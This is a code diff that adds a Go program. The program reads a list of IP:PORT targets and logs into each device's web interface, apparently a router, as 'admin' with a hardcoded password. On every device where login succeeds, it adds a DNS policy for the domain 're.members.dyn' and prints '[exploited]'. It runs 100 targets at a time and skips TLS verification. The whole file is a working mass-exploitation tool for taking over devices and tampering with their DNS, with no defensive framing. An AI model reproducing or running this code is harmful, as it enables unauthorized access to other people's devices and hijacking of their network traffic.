@@ -1,0 +1,123 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"sync"
+	"time"
+)
+
+type ResponseBody struct {
+	Stok      string `json:"stok"`
+	ErrorCode int    `json:"error_code"`
+}
+
+func main() {
+	// Read IP:PORT from ips.txt
+	file, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening ips.txt:", err)
+		return
+	}
+	defer file.Close()
+
+	// Create a semaphore with a max capacity of 100
+	sem := make(chan struct{}, 100)
+
+	// WaitGroup to wait for all goroutines to finish
+	var wg sync.WaitGroup
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ipPort := scanner.Text()
+		wg.Add(1)
+		sem <- struct{}{} // Acquire semaphore token
+		go func(ipPort string) {
+			defer wg.Done()
+			defer func() { <-sem }() // Release semaphore token
+			processIP(ipPort)
+		}(ipPort)
+	}
+	wg.Wait()
+}
+
+func processIP(ipPort string) {
+	// Construct URL
+	url := "http://" + ipPort + "/"
+
+	// Prepare payload for login
+	payload := []byte(`{"method":"do","login":{"username":"admin","password":"WaQ7xbhc9TefbwK"}}`)
+
+	// Create request for login
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+	if err != nil {
+		return
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36")
+	req.Header.Set("Connection", "close")
+
+	// Set timeout for HTTP client
+	client := &http.Client{
+		Timeout: 5 * time.Second, // Set timeout to 5 seconds
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Ignore SSL certificate errors
+		},
+	}
+
+	// Send request for login
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	// Read response body for login
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+
+	// Parse response body for login
+	var responseBody ResponseBody
+	err = json.Unmarshal(body, &responseBody)
+	if err != nil {
+		return
+	}
+
+	// Check login response
+	if responseBody.ErrorCode == 0 {
+		// Construct URL with stok
+		stokURL := url + "stok=" + responseBody.Stok + "/ds"
+
+		// Prepare payload for additional request
+		additionalPayload := []byte(`{"method":"add","dns":{"table":"dns_policy","para":{"domain":"re.members.dyn","userif":"WAN1","enable":"on"}}}`)
+
+		// Create request for additional request
+		additionalReq, err := http.NewRequest("POST", stokURL, bytes.NewBuffer(additionalPayload))
+		if err != nil {
+			return
+		}
+		additionalReq.Header.Set("Content-Type", "application/json; charset=UTF-8")
+		additionalReq.Header.Set("Accept", "text/plain, */*; q=0.01")
+		additionalReq.Header.Set("X-Requested-With", "XMLHttpRequest")
+		additionalReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36")
+		additionalReq.Header.Set("Origin", "http://"+ipPort)
+		additionalReq.Header.Set("Referer", "http://"+ipPort+"/")
+		additionalReq.Header.Set("Connection", "close")
+
+		// Send additional request
+		_, err = client.Do(additionalReq)
+		if err != nil {
+			return
+		}
+
+		fmt.Println("[exploited]", ipPort)
+	}
+}
